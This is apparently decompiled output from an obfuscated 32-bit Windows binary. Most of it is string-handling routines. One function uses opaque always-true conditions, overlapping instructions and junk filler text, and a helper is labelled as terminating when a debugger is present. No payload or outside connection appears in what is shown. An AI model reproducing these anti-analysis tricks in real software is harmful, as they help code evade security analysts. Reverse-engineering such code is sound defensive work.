  ppiVar5 = local_118;
  (*_DAT_003d9520)();
  local_8 = 0xffffffff;
  if (0xf < local_120) {
    FUN_003aee4b(local_134);
  }
  do {
    FUN_0038ead0();
    local_8 = 3;
    FUN_0038eb90();
    local_8._0_1_ = 4;
    iVar1 = FUN_0038eb90();
    local_8 = CONCAT31(local_8._1_3_,6);
    FUN_00392810(*(int *)(iVar1 + 0x10) + 1,in_stack_fffffe48);
    local_8 = 0xffffffff;
    if (0xf < local_120) {
      FUN_003aee4b(local_134);
    }
    iVar1 = (*_DAT_003d9550)();
    if (iVar1 != 0) {
      FUN_0038eb10();
      local_8 = 7;
      piVar2 = (int *)_strlen((char *)local_118);
      FUN_003894c0(&stack0xfffffe44,local_118,piVar2);
      local_8 = CONCAT31(local_8._1_3_,8);
      in_stack_fffffe20 = (int *)0x0;
      in_stack_fffffe38 = (int *)0x0;
      in_stack_fffffe28 = (int *)((uint)in_stack_fffffe28 & 0xffffff00);
      in_stack_fffffe18 = (int *)0x394497;
      FUN_003896c0(&stack0xfffffe28,(int **)&DAT_003d72cc,(int *)0x0,(int *)0xffffffff);
      local_8 = 0xffffffff;
      FUN_00392a10(in_stack_fffffe28);
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec10();
      local_8 = 0x11;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038eb10();
      local_8 = 0x12;
LAB_00394a6e:
      FUN_003893d0();
      uVar3 = extraout_EDX_02;
      goto LAB_00394a91;
    }
    FUN_0038eb50();
    local_8 = 0xb;
    FUN_0038eb90();
    local_8._0_1_ = 0xc;
    iVar1 = FUN_0038eb90();
    local_8 = CONCAT31(local_8._1_3_,0xe);
    FUN_00392810(*(int *)(iVar1 + 0x10) + 1,in_stack_fffffe38);
    local_8 = 0xffffffff;
    local_120 = 0xf;
    local_134 = (void *)((uint)local_134 & 0xffffff00);
    iVar1 = (*_DAT_003d9550)();
    if (iVar1 != 0) {
      FUN_0038eb10();
      local_8 = 0xf;
      in_stack_fffffe48 = (undefined4 *)0xf;
      piVar2 = (int *)_strlen((char *)local_118);
      FUN_003894c0(&stack0xfffffe34,local_118,piVar2);
      local_8 = CONCAT31(local_8._1_3_,0x10);
      in_stack_fffffe28 = (int *)0x0;
      in_stack_fffffe18 = (int *)((uint)in_stack_fffffe18 & 0xffffff00);
      FUN_003896c0(&stack0xfffffe18,(int **)&DAT_003d72cc,(int *)0x0,(int *)0xffffffff);
      local_8 = 0xffffffff;
      FUN_00392a10(in_stack_fffffe18);
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec10();
      local_8 = 0x1b;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038eb10();
      local_8 = 0x1c;
LAB_00394903:
      FUN_003893d0();
      uVar3 = extraout_EDX_01;
      goto LAB_00394a91;
    }
    FUN_0038eb10();
    local_8 = 0x13;
    in_stack_fffffe38 = (int *)_strlen((char *)local_118);
    FUN_003894c0(&stack0xfffffe3c,local_118,in_stack_fffffe38);
    local_8 = CONCAT31(local_8._1_3_,0x14);
    FUN_0038ebd0();
    local_8 = 0xffffffff;
    FUN_00392a10(in_stack_fffffe20);
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec10();
      local_8 = 0x25;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038eb10();
      local_8 = 0x26;
LAB_00394891:
      FUN_003893d0();
      uVar3 = extraout_EDX_00;
      goto LAB_00394a91;
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec50();
      local_8 = 0x2f;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038ec90();
      local_8 = 0x30;
      goto LAB_00394a6e;
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec90();
      local_8 = 0x39;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038ec90();
      local_8 = 0x3a;
      goto LAB_00394903;
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec90();
      local_8 = 0x43;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038ec90();
      local_8 = 0x44;
      goto LAB_00394891;
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec90();
      local_8 = 0x4d;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038ec90();
      local_8 = 0x4e;
      goto LAB_00394a6e;
    }
    iVar1 = (*_DAT_003d9550)();
    uVar4 = SUB41(ppiVar5,0);
    if (iVar1 != 0) {
      FUN_0038ec90();
      local_8 = 0x4f;
      FUN_003893d0();
      local_8 = 0xffffffff;
      FUN_0038ec90();
      local_8 = 0x50;
      FUN_003893d0();
      uVar3 = extraout_EDX;
      if (0xf < local_13c) {
        FUN_003aee4b(local_150);
        uVar3 = extraout_EDX_03;
      }
LAB_00394a91:
      *in_FS_OFFSET = local_10;
      terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar3,uVar4);
      return;
    }
    (*_DAT_003d9390)();
  } while( true );
}


/*
Unable to decompile 'FUN_00394ac0'
Cause: Exception while decompiling 00394ac0: process: timeout

*/


// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00395640(void)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar2;
  undefined in_stack_fffffef0;
  undefined local_10c [260];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  FUN_003a4280();
  iVar1 = FUN_003a55b0(DAT_003d9138);
  uVar2 = extraout_EDX;
  if (iVar1 == 0) {
    in_stack_fffffef0 = 1;
    (*_DAT_003d944c)(local_10c,&stack0xfffffef0);
    iVar1 = FUN_003a55b0(DAT_003d92a0);
    uVar2 = extraout_EDX_00;
    if (iVar1 == 0) {
      (*_DAT_003d9484)(0);
      uVar2 = extraout_EDX_01;
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,in_stack_fffffef0);
  return;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x00395801) overlaps instruction at (ram,0x00395800)
// 
// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003956b0(void)

{
  char extraout_CL;
  int extraout_ECX;
  int iVar1;
  int extraout_ECX_00;
  int extraout_ECX_01;
  uint extraout_ECX_02;
  uint uVar2;
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar3;
  undefined4 extraout_EDX_04;
  int unaff_EBX;
  code *unaff_ESI;
  int unaff_EDI;
  undefined uVar4;
  int iStackY512895;
  int iStackY512887;
  uint uStackY512879;
  undefined uVar5;
  WCHAR aWStack2008 [1000];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  trim_string((undefined (*) [16])aWStack2008,0,2000);
  uVar4 = (undefined *)register0x00000010 == (undefined *)0x7dc;
  lstrcatW(aWStack2008,
           L"In the later part of the 8th century BCE, Greek merchants brought classical civilization to the trade emporiums in Tanais and Phanagoria"
          );
  if (((bool)uVar4) || (!(bool)uVar4)) {
    func_0x00381060();
    unaff_ESI = lstrlenW_exref;
    lstrlenW(aWStack2008);
  }
  else {
    *(int *)(unaff_EBX + 0x3c602035) = *(int *)(unaff_EBX + 0x3c602035) + -1;
    uStackY512879 = uStackY512879 & 0xffffff00 | (uint)(byte)((char)uStackY512879 + extraout_CL);
    uVar4 = (byte)((char)uStackY512879 + extraout_CL) == 0;
    (**(code **)(extraout_EDX + -1))();
  }
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  if (((!(bool)uVar4) && (iVar1 = extraout_ECX, (bool)uVar4)) ||
     ((func_0x00381060(), !(bool)uVar4 && (iVar1 = extraout_ECX_00, (bool)uVar4)))) {
    _DAT_fd72dbd0 = _DAT_fd72dbd0 + unaff_EDI;
    iStackY512887 = iStackY512887 + -1;
    uVar4 = iStackY512887 == 0;
    (**(code **)(iVar1 + -1))(*(undefined4 *)(unaff_EBX + -0x146eca3));
  }
  else {
    FUN_00381120();
    (*unaff_ESI)(aWStack2008);
  }
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  if (((!(bool)uVar4) && ((bool)uVar4)) || ((func_0x00381060(), !(bool)uVar4 && ((bool)uVar4)))) {
    _DAT_fd7223d0 = _DAT_fd7223d0 + unaff_EDI;
    iStackY512895 = iStackY512895 + -1;
    uVar4 = iStackY512895 == 0;
    (*_DAT_feb8b6e7)(*(undefined4 *)(unaff_EBX + -0x14748a3));
  }
  else {
    FUN_00381120();
    (*unaff_ESI)(aWStack2008);
  }
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  (*unaff_ESI)(aWStack2008);
  if ((((bool)uVar4) || (!(bool)uVar4)) && ((func_0x00381060(), (bool)uVar4 || (!(bool)uVar4)))) {
    FUN_00381120();
    func_0x00381190();
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    if (((bool)uVar4) || (!(bool)uVar4)) {
      func_0x003a90f0();
      (*unaff_ESI)(aWStack2008);
    }
    else {
      uVar4 = (char)((char)iStackY512887 + (char)extraout_ECX_01) == '\0';
      (**(code **)(extraout_ECX_01 + -1))();
    }
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    if (((bool)uVar4) || (!(bool)uVar4)) {
      func_0x00381060();
      (*unaff_ESI)(aWStack2008);
    }
    else {
      uVar4 = iStackY512895 == 1;
      (*pcRamfeb7a7e7)();
    }
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    if ((((!(bool)uVar4) && (iVar1 = extraout_EDX_00, (bool)uVar4)) ||
        ((FUN_00395640(), !(bool)uVar4 && (iVar1 = extraout_EDX_01, (bool)uVar4)))) ||
       ((FUN_00395640(), !(bool)uVar4 && (iVar1 = extraout_EDX_02, (bool)uVar4)))) {
      iRamfffa61d0 = iRamfffa61d0 + unaff_EDI;
      iRamfffa57d0 = iRamfffa57d0 + unaff_EDI;
      uVar4 = uStackY512879 == 1;
      (**(code **)(iVar1 + -1))
                (*(undefined4 *)(unaff_EBX + -0x2c9a3),*(undefined4 *)(unaff_EBX + -0x2c9a3));
    }
    else {
      FUN_00395640();
      (*unaff_ESI)(aWStack2008);
    }
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    (*unaff_ESI)(aWStack2008);
    uVar5 = 0x28;
    (*unaff_ESI)();
    (*unaff_ESI)(aWStack2008);
    if (((bool)uVar4) || (uVar2 = extraout_ECX_02, uVar3 = extraout_EDX_03, !(bool)uVar4)) {
      FUN_00394ac0();
      uVar2 = local_8 ^ (uint)&stack0xfffffffc;
      uVar3 = extraout_EDX_04;
    }
    *(int *)(unaff_EBX + -0x32cc03b3) = *(int *)(unaff_EBX + -0x32cc03b3) + -1;
    terminate_if_debugger_present(uVar2,uVar3,uVar5);
    return;
  }
  _DAT_fd716bd0 = _DAT_fd716bd0 + unaff_EDI;
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



void __fastcall FUN_00395990(int *param_1,int **param_2,int *param_3)

{
  undefined *unaff_ESI;
  
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *unaff_ESI = 0;
  FUN_003896c0(unaff_ESI,param_2,param_1,param_3);
  return;
}



void FUN_003959c0(void)

{
  void **unaff_ESI;
  
  if ((void *)0x7 < unaff_ESI[5]) {
    FUN_003aee4b(*unaff_ESI);
  }
  unaff_ESI[5] = (void *)0x7;
  unaff_ESI[4] = (void *)0x0;
  *(undefined2 *)unaff_ESI = 0;
  return;
}



uint FUN_003959f0(undefined4 *param_1,char *param_2,uint param_3)

{
  void *_Buf;
  uint in_EAX;
  void *_Buf1;
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  size_t _MaxCount;
  
  if ((param_3 != 0) || ((uint)param_1[4] <= in_EAX && in_EAX != param_1[4])) {
    if ((in_EAX < (uint)param_1[4]) && (uVar3 = param_1[4] - in_EAX, param_3 <= uVar3)) {
      _MaxCount = uVar3 + (1 - param_3);
      puVar2 = param_1;
      if (0xf < (uint)param_1[5]) {
        puVar2 = (undefined4 *)*param_1;
      }
      _Buf = (void *)((int)puVar2 + in_EAX);
      _Buf1 = _memchr(_Buf,(int)*param_2,_MaxCount);
      while (_Buf1 != (void *)0x0) {
        iVar1 = _memcmp(_Buf1,param_2,param_3);
        if (iVar1 == 0) {
          if (0xf < (uint)param_1[5]) {
            param_1 = (undefined4 *)*param_1;
          }
          return (int)_Buf1 - (int)param_1;
        }
        _MaxCount = (int)_Buf + ((_MaxCount - 1) - (int)_Buf1);
        _Buf = (void *)((int)_Buf1 + 1);
        _Buf1 = _memchr(_Buf,(int)*param_2,_MaxCount);
      }
    }
    in_EAX = 0xffffffff;
  }
  return in_EAX;
}



int FUN_00395aa0(size_t param_1)

{
  char *pcVar1;
  char **ppcVar2;
  char **in_EAX;
  char **ppcVar3;
  void *pvVar4;
  
  pcVar1 = in_EAX[4];
  if (pcVar1 != (char *)0x0) {
    ppcVar3 = in_EAX;
    if ((char *)0xf < in_EAX[5]) {
      ppcVar3 = (char **)*in_EAX;
    }
    ppcVar2 = in_EAX;
    if ((char *)0xf < in_EAX[5]) {
      ppcVar2 = (char **)*in_EAX;
    }
    for (; ppcVar2 < pcVar1 + (int)ppcVar3; ppcVar2 = (char **)((int)ppcVar2 + 1)) {
      pvVar4 = _memchr(&DAT_003d0bec,(int)*(char *)ppcVar2,param_1);
      if (pvVar4 == (void *)0x0) {
        if ((char *)0xf < in_EAX[5]) {
          in_EAX = (char **)*in_EAX;
        }
        return (int)ppcVar2 - (int)in_EAX;
      }
    }
  }
  return -1;
}



// WARNING: Removing unreachable block (ram,0x00395b20)

int FUN_00395b10(void)

{
  char *pcVar1;
  undefined4 *in_EAX;
  void *pvVar2;
  undefined4 *puVar3;
  size_t unaff_EBX;
  undefined4 *puVar4;
  
  if (in_EAX[4] != 0) {
    puVar4 = in_EAX;
    if (0xf < (uint)in_EAX[5]) {
      puVar4 = (undefined4 *)*in_EAX;
    }
    puVar4 = (undefined4 *)((int)puVar4 + in_EAX[4] + -1);
    pvVar2 = _memchr(&DAT_003d0bec,(int)*(char *)puVar4,unaff_EBX);
    while( true ) {
      if (pvVar2 == (void *)0x0) {
        if (0xf < (uint)in_EAX[5]) {
          in_EAX = (undefined4 *)*in_EAX;
        }
        return (int)puVar4 - (int)in_EAX;
      }
      puVar3 = FUN_00389440(in_EAX);
      if (puVar4 == puVar3) break;
      pcVar1 = (char *)((int)puVar4 + -1);
      puVar4 = (undefined4 *)((int)puVar4 + -1);
      pvVar2 = _memchr(&DAT_003d0bec,(int)*pcVar1,unaff_EBX);
    }
  }
  return -1;
}



void __fastcall FUN_00395b90(uint param_1,byte param_2)

{
  undefined4 *in_EAX;
  int unaff_ESI;
  
  if (param_1 == 1) {
    if (0xf < (uint)in_EAX[5]) {
      in_EAX = (undefined4 *)*in_EAX;
    }
    *(byte *)((int)in_EAX + unaff_ESI) = param_2;
    return;
  }
  if (0xf < (uint)in_EAX[5]) {
    in_EAX = (undefined4 *)*in_EAX;
  }
  trim_string((undefined (*) [16])((int)in_EAX + unaff_ESI),param_2,param_1);
  return;
}



undefined * __thiscall FUN_00395bc0(void *this,void *param_1)

{
  char *in_EAX;
  size_t sVar1;
  
  sVar1 = _strlen(in_EAX);
  FUN_00395d90(param_1,sVar1);
  *(undefined4 *)((int)this + 0x14) = 0xf;
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined *)this = 0;
  FUN_003893d0();
  return (undefined *)this;
}



undefined4 * __cdecl FUN_00395c10(undefined4 *param_1,undefined4 *param_2)

{
  int iVar1;
  void *pvVar2;
  bool bVar3;
  size_t sVar4;
  void *pvVar5;
  undefined4 *puVar6;
  char *unaff_EBX;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c32c9;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  param_1[5] = 0xf;
  param_1[4] = 0;
  *(undefined *)param_1 = 0;
  local_8 = 0;
  iVar1 = param_2[4];
  sVar4 = _strlen(unaff_EBX);
  pvVar5 = (void *)(sVar4 + iVar1);
  pvVar2 = (void *)param_1[4];
  if (((pvVar2 <= pvVar5) && ((void *)param_1[5] != pvVar5)) &&
     (bVar3 = FUN_003897b0(param_1,pvVar5,'\x01'), bVar3 != false)) {
    param_1[4] = pvVar2;
    puVar6 = param_1;
    if (0xf < (uint)param_1[5]) {
      puVar6 = (undefined4 *)*param_1;
    }
    *(undefined *)((int)puVar6 + (int)pvVar2) = 0;
  }
  FUN_00389c20(param_2,0);
  sVar4 = _strlen(unaff_EBX);
  FUN_00395d90(param_1,sVar4);
  *in_FS_OFFSET = local_10;
  return param_1;
}



undefined4 * __cdecl FUN_00395cd0(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)

{
  void *pvVar1;
  bool bVar2;
  void *pvVar3;
  undefined4 *puVar4;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c32c9;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  param_1[5] = 0xf;
  param_1[4] = 0;
  *(undefined *)param_1 = 0;
  local_8 = 0;
  pvVar1 = (void *)param_1[4];
  pvVar3 = (void *)(param_2[4] + param_3[4]);
  if (((pvVar1 <= pvVar3) && ((void *)param_1[5] != pvVar3)) &&
     (bVar2 = FUN_003897b0(param_1,pvVar3,'\x01'), bVar2 != false)) {
    param_1[4] = pvVar1;
    puVar4 = param_1;
    if (0xf < (uint)param_1[5]) {
      puVar4 = (undefined4 *)*param_1;
    }
    *(undefined *)((int)puVar4 + (int)pvVar1) = 0;
  }
  FUN_00389c20(param_2,0);
  FUN_00389c20(param_3,0);
  *in_FS_OFFSET = local_10;
  return param_1;
}



int ** __thiscall FUN_00395d90(void *this,uint param_1)

{
  undefined4 *in_EAX;
  undefined4 *puVar1;
  void *pvVar2;
  int **ppiVar3;
  int iVar4;
  void *pvVar5;
  uint uVar6;
  undefined8 uVar7;
  
  if (in_EAX != (undefined4 *)0x0) {
    uVar6 = *(uint *)((int)this + 0x14);
    puVar1 = (undefined4 *)this;
    if (0xf < uVar6) {
                    // WARNING: Load size is inaccurate
      puVar1 = *this;
    }
    if (puVar1 <= in_EAX) {
      pvVar2 = this;
      if (0xf < uVar6) {
                    // WARNING: Load size is inaccurate
        pvVar2 = *this;
      }
      if (in_EAX < (undefined4 *)(*(int *)((int)this + 0x10) + (int)pvVar2)) {
        if (0xf < uVar6) {
                    // WARNING: Load size is inaccurate
          ppiVar3 = (int **)FUN_00389c20((undefined4 *)this,(int)in_EAX - *this);
          return ppiVar3;
        }
        ppiVar3 = (int **)FUN_00389c20((undefined4 *)this,(int)in_EAX - (int)this);
        return ppiVar3;
      }
    }
  }
  iVar4 = *(int *)((int)this + 0x10);
  uVar6 = param_1;
  if (-iVar4 - 1U <= param_1) {
    uVar7 = FUN_003ae350("string too long");
    uVar6 = (uint)((ulonglong)uVar7 >> 0x20);
    iVar4 = (int)uVar7;
  }
  uVar7 = CONCAT44(uVar6,iVar4);
  if (uVar6 != 0) {
    pvVar2 = (void *)(iVar4 + uVar6);
    if (pvVar2 == (void *)0xffffffff) {
      uVar7 = FUN_003ae350("string too long");
    }
    uVar6 = (uint)((ulonglong)uVar7 >> 0x20);
    if (*(void **)((int)this + 0x14) < pvVar2) {
      FUN_00389950(this,pvVar2,(void *)uVar7);
      uVar6 = param_1;
      if (pvVar2 == (void *)0x0) {
        return (int **)this;
      }
    }
    else {
      if (pvVar2 == (void *)0x0) {
        *(undefined4 *)((int)this + 0x10) = 0;
        if ((void *)0xf < *(void **)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
          **this = 0;
          return (int **)this;
        }
        *(undefined *)this = 0;
        return (int **)this;
      }
    }
    pvVar5 = this;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      pvVar5 = *this;
    }
    FUN_003aee70((undefined4 *)(*(int *)((int)this + 0x10) + (int)pvVar5),in_EAX,uVar6);
    *(void **)((int)this + 0x10) = pvVar2;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*this + (int)pvVar2) = 0;
      return (int **)this;
    }
    *(undefined *)((int)this + (int)pvVar2) = 0;
  }
  return (int **)this;
}



void FUN_00395eb0(int **param_1,undefined *param_2,undefined *param_3)

{
  undefined uVar1;
  bool bVar2;
  int *piVar3;
  int *piVar4;
  int **ppiVar5;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3290;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  piVar3 = (int *)(param_3 + -(int)param_2);
  piVar4 = param_1[4];
  if (((piVar4 <= piVar3) && (param_1[5] != piVar3)) &&
     (bVar2 = FUN_003897b0(param_1,piVar3,'\x01'), bVar2 != false)) {
    param_1[4] = piVar4;
    ppiVar5 = param_1;
    if ((int *)0xf < param_1[5]) {
      ppiVar5 = (int **)*param_1;
    }
    *(undefined *)((int)ppiVar5 + (int)piVar4) = 0;
  }
  local_8 = 0;
LAB_00395f20:
  do {
    while( true ) {
      if (param_2 == param_3) {
        *in_FS_OFFSET = local_10;
        return;
      }
      uVar1 = *param_2;
      piVar4 = param_1[4];
      if (-(int)piVar4 - 1U < 2) {
        piVar4 = (int *)FUN_003ae350("string too long");
      }
      piVar3 = (int *)((int)piVar4 + 1);
      if (piVar3 == (int *)0xffffffff) {
        piVar4 = (int *)FUN_003ae350("string too long");
      }
      if (piVar3 <= param_1[5]) break;
      FUN_00389950(param_1,piVar3,piVar4);
      if (piVar3 != (int *)0x0) goto LAB_00395f6c;
LAB_00395ffe:
      param_2 = param_2 + 1;
    }
    if (piVar3 == (int *)0x0) {
      param_1[4] = (int *)0x0;
      if (param_1[5] < (int *)0x10) {
        *(undefined *)param_1 = 0;
        param_2 = param_2 + 1;
      }
      else {
        *(undefined *)*param_1 = 0;
        param_2 = param_2 + 1;
      }
      goto LAB_00395f20;
    }
LAB_00395f6c:
    ppiVar5 = param_1;
    if ((int *)0xf < param_1[5]) {
      ppiVar5 = (int **)*param_1;
    }
    *(undefined *)((int)ppiVar5 + (int)param_1[4]) = uVar1;
    param_1[4] = piVar3;
    if (param_1[5] < (int *)0x10) {
      *(undefined *)((int)param_1 + (int)piVar3) = 0;
      goto LAB_00395ffe;
    }
    *(undefined *)((int)*param_1 + (int)piVar3) = 0;
    param_2 = param_2 + 1;
  } while( true );
}



void Catch_All_00395f7d(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = *(void ***)(unaff_EBP + 8);
  if ((void *)0xf < ppvVar1[5]) {
    FUN_003aee4b(*ppvVar1);
  }
  ppvVar1[5] = (void *)0xf;
  ppvVar1[4] = (void *)0x0;
  *(undefined *)ppvVar1 = 0;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



void FUN_00396020(byte param_1)

{
  int *piVar1;
  int *piVar2;
  int **ppiVar3;
  uint unaff_EBX;
  int **unaff_ESI;
  
  piVar2 = unaff_ESI[4];
  if (-(int)piVar2 - 1U <= unaff_EBX) {
    piVar2 = (int *)FUN_003ae350("string too long");
  }
  if (unaff_EBX != 0) {
    piVar1 = (int *)((int)piVar2 + unaff_EBX);
    if (piVar1 == (int *)0xffffffff) {
      piVar2 = (int *)FUN_003ae350("string too long");
    }
    if (unaff_ESI[5] < piVar1) {
      FUN_00389950(unaff_ESI,piVar1,piVar2);
      if (piVar1 == (int *)0x0) {
        return;
      }
    }
    else {
      if (piVar1 == (int *)0x0) {
        unaff_ESI[4] = (int *)0x0;
        if ((int *)0xf < unaff_ESI[5]) {
          *(undefined *)*unaff_ESI = 0;
          return;
        }
        *(undefined *)unaff_ESI = 0;
        return;
      }
    }
    piVar2 = unaff_ESI[4];
    if (unaff_EBX == 1) {
      if (unaff_ESI[5] < (int *)0x10) {
        *(byte *)((int)unaff_ESI + (int)piVar2) = param_1;
      }
      else {
        *(byte *)((int)*unaff_ESI + (int)piVar2) = param_1;
      }
    }
    else {
      ppiVar3 = unaff_ESI;
      if ((int *)0xf < unaff_ESI[5]) {
        ppiVar3 = (int **)*unaff_ESI;
      }
      trim_string((undefined (*) [16])((int)ppiVar3 + (int)piVar2),param_1,unaff_EBX);
    }
    unaff_ESI[4] = piVar1;
    if ((int *)0xf < unaff_ESI[5]) {
      *(undefined *)((int)*unaff_ESI + (int)piVar1) = 0;
      return;
    }
    *(undefined *)((int)unaff_ESI + (int)piVar1) = 0;
  }
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003960f0(int param_1,int param_2,void *param_3)

{
  bool bVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  undefined4 *puVar5;
  void **_Src;
  uint uVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar7;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined4 extraout_EDX_10;
  undefined4 extraout_EDX_11;
  int **ppiVar8;
  int **in_FS_OFFSET;
  undefined8 uVar9;
  undefined4 uStack0000001c;
  uint in_stack_00000020;
  undefined4 *in_stack_00000028;
  undefined4 uStack00000038;
  uint in_stack_0000003c;
  void *in_stack_00000044;
  uint in_stack_00000058;
  void *in_stack_fffff960;
  undefined uVar10;
  undefined *puVar11;
  int **local_658;
  int **local_654;
  undefined4 local_650;
  int **local_648;
  int local_644;
  int **local_640;
  void *local_63c [4];
  undefined4 local_62c;
  uint local_628;
  void *local_620 [4];
  undefined4 local_610;
  uint local_60c;
  void *local_604;
  undefined4 local_5f4;
  uint local_5f0;
  void *local_5e8;
  undefined4 local_5d8;
  uint local_5d4;
  void *local_5cc [4];
  undefined4 local_5bc;
  uint local_5b8;
  void *local_5b0;
  undefined4 local_5a0;
  uint local_59c;
  void *local_594;
  uint local_580;
  void *local_578 [4];
  void *local_568;
  void *local_564;
  void *local_55c [4];
  undefined4 local_54c;
  uint local_548;
  void *local_540 [4];
  undefined4 local_530;
  uint local_52c;
  void *local_524 [4];
  undefined4 local_514;
  uint local_510;
  undefined local_508 [1000];
  undefined local_120 [264];
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c43de;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_644 = param_1;
  local_548 = 0xf;
  local_54c = 0;
  local_55c[0] = (void *)((uint)local_55c[0] & 0xffffff00);
  local_8 = 3;
  if (param_2 == 0) {
    trim_string((undefined (*) [16])local_508,0,1000);
    puVar11 = local_508;
    iVar3 = (*_DAT_003d9500)();
    ppiVar8 = (int **)((iVar3 < 0) - 1 & (uint)local_508);
  }
  else {
    trim_string((undefined (*) [16])local_508,0,1000);
    puVar11 = local_508;
    iVar3 = (*_DAT_003d9500)();
    ppiVar8 = (int **)((iVar3 < 0) - 1 & (uint)local_508);
  }
  piVar4 = (int *)_strlen((char *)ppiVar8);
  FUN_003894c0(local_55c,ppiVar8,piVar4);
  FUN_00395cd0(local_5cc,local_55c,&param_3);
